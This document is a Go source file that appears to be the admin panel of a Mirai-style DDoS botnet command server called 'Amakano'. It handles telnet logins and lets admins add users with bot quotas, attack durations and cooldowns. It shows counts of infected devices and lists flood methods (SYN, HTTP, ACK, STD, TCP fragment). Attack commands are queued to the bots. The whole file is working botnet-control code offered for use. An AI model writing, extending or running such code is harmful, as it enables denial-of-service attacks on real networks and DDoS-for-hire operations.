package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
      this.conn.Write([]byte("\033[?1049h"))
      this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))
      this.conn.Write([]byte("\033[2J\033[1H"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()


    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[1;31musername\033[01;97m:\033[1;31m \033[97m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }


    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[1;31mpassword\033[01;97m:\033[1;31m \033[97m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
    
    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\n\033[1;31mwrong details.\033[0m"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    this.conn.Write([]byte("\r\n\033[0m"))
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
 				if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;devices: %d\007", BotCount))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
    this.conn.Write([]byte("\033[2J\033[1H"))
   
    for {
        var botCatagory string
        var botCount int
       	this.conn.Write([]byte("\033[\033[1;31m" + username + "\033[1;36m@\033[\033[1;31mAmakano \033[1;36m$ \033[1;97m"))
        cmd, err := this.ReadLine(false)
        
        if cmd == "clear" || cmd == "cls" || cmd == "c" {
	    this.conn.Write([]byte("\033[2J\033[1H"))
   		
            continue
        }
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        
        if cmd == "" {
            continue
        }

        botCount = userInfo.maxBots
     
if userInfo.admin == 1 && cmd == "adduser" {
            this.conn.Write([]byte("\x1b[1;31mEnter new username\x1b[1;97m: \x1b[1;36m"))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;31mEnter new password\x1b[1;97m: \x1b[1;36m"))
            new_pw, err := this.ReadLine(true)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;31mEnter wanted bot count (-1 for full net)\x1b[1;97m: \x1b[1;36m"))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;31mMax attack duration (-1 for none)\x1b[1;97m: \x1b[1;36m"))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;31mCooldown time (0 for none)\x1b[1;97m: \x1b[1;36m"))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\r\n\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[1;31mUser added successfully.\033[0m\r\n"))
            }
            continue
        }
        if userInfo.admin == 1 && cmd == "botcount" || cmd == "bots" || cmd == "count" || cmd == "bc" {
            botCount = clientList.Count()
            m := clientList.Distribution()
			    this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m[\x1b[1;36m+\x1b[1;31m]----------------\x1b[1;31m[\x1b[1;36m+\x1b[1;31m]\r\n")))
				for k, v := range m{
				
                this.conn.Write([]byte(fmt.Sprintf("\033[1;97m%s:\t\033[1;31m[\033[1;36m%d\033[1;31m]\033[0m\r\n", k, v)))
				}
          
            this.conn.Write([]byte(fmt.Sprintf("\x1b[1;97mTOTAL\x1b[1;97m: \x1b[36m%d\x1b[1;31m\r\n", botCount)))
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m[\x1b[1;36m+\x1b[1;31m]----------------\x1b[1;31m[\x1b[1;36m+\x1b[1;31m]\r\n")))
            continue
        }

		
         if err != nil || cmd == "attacks" || cmd == "ATTACKS" || cmd == "?" {
            this.conn.Write([]byte("\x1b[1;31m[\x1b[1;36m+\x1b[1;31m]\x1b[1;31m---------------------------------------------------------\x1b[1;31m[\x1b[1;36m+\x1b[1;31m]\r\n"))
            this.conn.Write([]byte("\x1b[1;31m |\x1b[1;97m                       Amakano Methods                     \x1b[1;31m|\r\n"))
            this.conn.Write([]byte("\x1b[1;31m |\x1b[1;97m .syn [ip] [time] dport=[port]             | syn           \x1b[1;31m|\r\n"))
            this.conn.Write([]byte("\x1b[1;31m |\x1b[1;97m .http [ip] [time] dport=[port] domain=[ip]| http          \x1b[1;31m|\r\n"))
			this.conn.Write([]byte("\x1b[1;31m |\x1b[1;97m .std [ip] [time] dport=[port]             | std           \x1b[1;31m|\r\n"))
            this.conn.Write([]byte("\x1b[1;31m |\x1b[1;97m .ack [ip] [time] dport=[port]             | ack           \x1b[1;31m|\r\n"))
            this.conn.Write([]byte("\x1b[1;31m |\x1b[1;97m .tcpfrag [ip] [time] dport=[port]         | vse           \x1b[1;31m|\r\n"))
            this.conn.Write([]byte("\x1b[1;31m |\x1b[1;97m cls clear or c                            | clears screen \x1b[1;31m|\r\n"))
            this.conn.Write([]byte("\x1b[1;31m[\x1b[1;36m+\x1b[1;31m]\x1b[1;31m---------------------------------------------------------\x1b[1;31m[\x1b[1;36m+\x1b[1;31m]\r\n"))
            continue

        }

        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("error\r\n")))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("error\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if userInfo.admin == 1 && cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
